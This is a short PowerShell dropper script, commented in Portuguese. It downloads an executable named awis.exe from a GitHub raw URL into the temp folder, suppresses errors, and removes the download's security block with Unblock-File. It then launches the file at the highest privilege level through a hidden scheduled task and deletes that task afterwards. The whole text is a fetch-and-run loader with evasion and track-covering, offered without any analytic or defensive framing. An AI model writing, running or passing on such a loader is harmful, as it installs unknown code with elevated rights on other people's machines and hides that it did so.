# Baixar e executar awis.exe com privilégios
$url = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
$path = "$env:TEMP\awis.exe"
Invoke-WebRequest $url -OutFile $path -ErrorAction SilentlyContinue
Unblock-File $path -ErrorAction SilentlyContinue
schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process '$path' -WindowStyle Hidden" /SC ONCE /ST 00:00 /RL HIGHEST /F
if ($?) { schtasks /Run /TN "RunTask"; Start-Sleep -Seconds 10; schtasks /Delete /TN "RunTask" /F }
